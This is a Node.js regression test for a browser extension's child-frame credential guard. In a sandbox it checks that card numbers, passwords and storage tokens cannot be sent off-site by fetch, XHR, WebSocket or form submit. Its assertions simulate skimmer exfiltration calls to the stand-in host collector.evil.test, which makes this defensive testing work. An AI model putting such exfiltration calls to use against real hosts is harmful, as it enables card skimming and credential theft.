/* WardenOne — Copyright (C) 2026 iri
   Licensed under the GNU General Public License v3 or later. See LICENSE.
   Official source: https://github.com/iri-dev/WardenOne
   Upstream filter-list attribution: CREDITS.md
   Redistributing a modified copy? GPLv3 section 5(a) requires you to mark it as changed,
   with the date, and to keep these notices intact. */
/*
 * Runtime checks for the compact child-frame credential guard.
 *
 * The test evaluates the shipped guard block, not a second implementation. A small
 * page-realm harness supplies the APIs the block wraps and records which native calls
 * still happen. This is the regression the former disclosure-only test could not give:
 * the manifest can say all_frames while the actual fetch/XHR/form paths remain native.
 *
 * Run: node tools/test-frame-credential-guard.js
 */
'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const ROOT = path.resolve(__dirname, '..');
const source = fs.readFileSync(path.join(ROOT, 'anti-redirect.js'), 'utf8');
const domainUtils = fs.readFileSync(path.join(ROOT, 'domain-utils.js'), 'utf8');
const start = source.indexOf('const CREDENTIAL_FRAME_VALUE_LIMIT');
const end = source.indexOf('/* CREDENTIAL_FRAME_GUARD_END */', start);
assert(start >= 0 && end > start, 'the shipped credential-frame block has stable markers');
const guardBlock = source.slice(start, end);

function makeField(kind, value) {
  const card = kind === 'card';
  return {
    tagName: 'INPUT',
    type: card ? 'text' : 'password',
    name: card ? 'cardnumber' : 'password',
    id: '',
    autocomplete: card ? 'cc-number' : 'current-password',
    placeholder: '',
    value,
    getAttribute() { return ''; },
  };
}

function makeHarness(options) {
  const opts = options || {};
  const state = {
    fetches: [], beacons: [], xhrSends: [], websocketSends: [], formSubmits: [], emits: [],
  };
  const listeners = Object.create(null);
  const fields = [];
  const config = {
    enabled: true,
    blockTokenExfil: true,
    detectSkimmers: true,
    paymentCardGuard: true,
  };

  class FakeStorage {
    constructor() { this.data = Object.create(null); }
    get length() { return Object.keys(this.data).length; }
    key(index) { return Object.keys(this.data)[index] || null; }
    getItem(key) { return Object.prototype.hasOwnProperty.call(this.data, key) ? this.data[key] : null; }
    setItem(key, value) { this.data[String(key)] = String(value); }
  }

  class FakeFormData {
    constructor(form) {
      this.pairs = [];
      const list = form && form.fields || [];
      for (const field of list) this.pairs.push([field.name || '', field.value || '']);
    }
    forEach(fn) { for (const [key, value] of this.pairs) fn(value, key); }
  }

  class FakeXHR {
    constructor() { this.events = []; }
    open(method, url) { this.nativeUrl = String(url); }
    setRequestHeader(name, value) { this.nativeHeaders = (this.nativeHeaders || []).concat([[name, value]]); }
    send(body) { state.xhrSends.push(body); }
    dispatchEvent(event) { this.events.push(event && event.type); }
  }

  class FakeWebSocket {
    constructor(url) { this.url = url; }
    send(data) { state.websocketSends.push(data); }
  }

  class FakeForm {
    constructor(action, formFields) {
      this.action = action;
      this.fields = formFields || [];
    }
    querySelectorAll() { return this.fields; }
    submit() { state.formSubmits.push(this.action); }
  }

  const document = {
    baseURI: opts.href || 'https://checkout.example/frame',
    referrer: opts.referrer || 'https://shop.example/checkout',
    cookie: '',
    addEventListener(type, fn) { (listeners[type] = listeners[type] || []).push(fn); },
    querySelectorAll(selector) {
      return /input|textarea/.test(String(selector || '')) ? fields : [];
    },
  };

  const sandbox = {
    URL, URLSearchParams, Headers, ArrayBuffer, TextDecoder, Map, Set, WeakMap,
    Object, String, Number, Date, Math, Promise, JSON, RegExp,
    encodeURIComponent, decodeURIComponent,
    btoa: (text) => Buffer.from(String(text), 'binary').toString('base64'),
    DOMException,
    Event: class Event { constructor(type) { this.type = type; } },
    ProgressEvent: class ProgressEvent { constructor(type) { this.type = type; } },
    FormData: FakeFormData,
    XMLHttpRequest: FakeXHR,
    WebSocket: FakeWebSocket,
    HTMLFormElement: FakeForm,
    Storage: FakeStorage,
    document,
    location: {
      href: opts.href || 'https://checkout.example/frame',
      hostname: 'checkout.example',
      protocol: 'https:',
    },
    navigator: {
      sendBeacon(url, data) { state.beacons.push([url, data]); return true; },
    },
    fetch(input, init) { state.fetches.push([input, init]); return Promise.resolve({ ok: true }); },
    localStorage: new FakeStorage(),
    sessionStorage: new FakeStorage(),
    WO_GUARD_VERSION: '1.0.1',
    TOP_FRAME: !!opts.topFrame,
    cfg: () => config,
    hostAllowedByUser: () => false,
    regHost: (host) => String(host || '').replace(/^www\./, '').toLowerCase(),
    sameParty(a, b) {
      const clean = (host) => String(host || '').replace(/^www\./, '').toLowerCase();
      const site = (host) => clean(host).split('.').slice(-2).join('.');
      return !!(clean(a) && clean(b) && (clean(a) === clean(b) || site(a) === site(b)));
    },
    emit(type, detail) { state.emits.push({ type, detail }); },
    woOn(target, type, fn) { target.addEventListener(type, fn); },
    woTimeout(fn) { fn(); return 1; },
  };
  sandbox.window = sandbox;
  sandbox.self = sandbox;
  sandbox.top = opts.topFrame ? sandbox : {};
  sandbox.__wardenOneAntiRedirectHardener = sandbox.WO_GUARD_VERSION;

  vm.createContext(sandbox);
  vm.runInContext(domainUtils, sandbox, { filename: 'domain-utils.js' });
  vm.runInContext(guardBlock, sandbox, { filename: 'anti-redirect.js:credential-frame-guard' });

  return {
    sandbox,
    state,
    fields,
    config,
    makeForm: (action, formFields) => new sandbox.HTMLFormElement(action, formFields),
    fire(type, target) {
      const event = {
        target,
        defaultPrevented: false,
        immediateStopped: false,
        preventDefault() { this.defaultPrevented = true; },
        stopImmediatePropagation() { this.immediateStopped = true; },
      };
      for (const listener of listeners[type] || []) listener(event);
      return event;
    },
  };
}

(async () => {
  const frame = makeHarness();
  const card = makeField('card', '4111 1111 1111 1111');
  const password = makeField('password', 'correct horse battery staple');
  frame.fields.push(card, password);
  frame.fire('input', card);
  frame.fire('input', password);

  await frame.sandbox.fetch('https://api.checkout.example/pay', { body: 'card=4111111111111111' });
  assert.strictEqual(frame.state.fetches.length, 1, 'same-site card requests remain native');

  await frame.sandbox.fetch('https://api.stripe.com/v1/tokens', { body: 'card=4111111111111111' });
  assert.strictEqual(frame.state.fetches.length, 2, 'known payment processors remain native');

  await assert.rejects(
    frame.sandbox.fetch('https://collector.evil.test/collect', { body: 'card=4111111111111111' }),
    /credential guard/,
    'an unrelated frame destination cannot receive an entered card',
  );
  assert.strictEqual(frame.state.fetches.length, 2, 'blocked card fetch never reaches the native API');
  assert.strictEqual(frame.state.emits.at(-1).type, 'blocked_skimmer_exfil');
  assert.strictEqual(Object.prototype.hasOwnProperty.call(frame.state.emits.at(-1).detail, 'value'), false,
    'block telemetry contains no credential value');

  const xhr = new frame.sandbox.XMLHttpRequest();
  xhr.open('POST', 'https://collector.evil.test/password');
  xhr.send('password=correct%20horse%20battery%20staple');
  assert.strictEqual(frame.state.xhrSends.length, 0, 'off-site password XHR never reaches native send');
  assert.deepStrictEqual(Array.from(xhr.events), ['readystatechange', 'error', 'loadend'],
    'blocked XHR receives a terminal network-error shape');

  const opaqueToken = 'shortOpaqueSecret123';
  frame.sandbox.localStorage.setItem('session_token', opaqueToken);
  await assert.rejects(
    frame.sandbox.fetch('https://collector.evil.test/token', { body: opaqueToken }),
    /credential guard/,
    'a later storage token is remembered even after the initial storage scan',
  );
  assert.strictEqual(frame.state.emits.at(-1).type, 'blocked_token_exfil');

  const ws = new frame.sandbox.WebSocket('wss://collector.evil.test/socket');
  ws.send('password=correct horse battery staple');
  assert.strictEqual(frame.state.websocketSends.length, 0, 'off-site WebSocket credential sends are blocked');

  const form = frame.makeForm('https://collector.evil.test/form', [card]);
  frame.sandbox.HTMLFormElement.prototype.submit.call(form);
  assert.strictEqual(frame.state.formSubmits.length, 0, 'programmatic form.submit cannot bypass the guard');
  const submitEvent = frame.fire('submit', form);
  assert.strictEqual(submitEvent.defaultPrevented && submitEvent.immediateStopped, true,
    'native submit events are cancelled before page listeners can send the form');

  frame.config.blockTokenExfil = false;
  frame.config.detectSkimmers = false;
  frame.config.paymentCardGuard = false;
  await frame.sandbox.fetch('https://collector.evil.test/disabled', { body: 'card=4111111111111111' });
  assert.strictEqual(frame.state.fetches.length, 3, 'all three user toggles are honoured in child frames');

  const top = makeHarness({ topFrame: true });
  const nativeTopFetch = top.sandbox.fetch;
  await top.sandbox.fetch('https://collector.evil.test/top', { body: 'access_token=abcdefghijklmnopqrstuvwxyz123456' });
  assert.strictEqual(top.sandbox.fetch, nativeTopFetch, 'the compact layer does not stack over the top-frame engine');
  assert.strictEqual(top.state.fetches.length, 1, 'top-frame requests remain owned by content.min.js');

  console.log('[ok] child-frame credential guard blocks fetch/XHR/WebSocket/forms and preserves trusted/top-frame paths');
})().catch((error) => {
  console.error(error && error.stack || error);
  process.exit(1);
});
